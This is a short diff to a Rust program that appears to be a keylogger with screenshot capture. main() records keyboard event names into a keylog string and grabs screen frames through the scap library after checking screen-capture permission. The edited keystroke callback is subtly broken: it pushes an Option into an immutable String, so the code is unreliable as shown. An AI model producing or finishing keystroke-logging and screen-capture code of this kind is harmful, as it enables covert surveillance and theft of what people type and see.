@@ -12,6 +12,7 @@ pub fn take_screenshot() -> String {
 
 fn main() {
 
+    
     let keylog = String::new();
 
     // This will block.
@@ -21,7 +22,9 @@ fn main() {
 
     fn callback(event: Event, keylog: String) {
         match event.name {
-            Some(string) => {keylog.push(ch);}
+            Some(string) => {
+                let ch = event.name;
+                keylog.push(ch);}
             None => {}
         }
     }
@@ -35,7 +38,7 @@ fn main() {
     // Check if we have permission to capture screen
     // If we don't, request it.
     if !scap::has_permission() {
-        println!("❌ Permission not granted. Requesting permission...");
+        println!("Permission not granted. Requesting permission...");
         if !scap::request_permission() {
             println!("❌ Permission denied");
             return;
@@ -82,7 +85,7 @@ fn main() {
     let frame = capturer.get_next_frame().unwrap();
     match frame {
         Frame::RGB(data) => {
-            
+           
         }
         _ => {}
     }
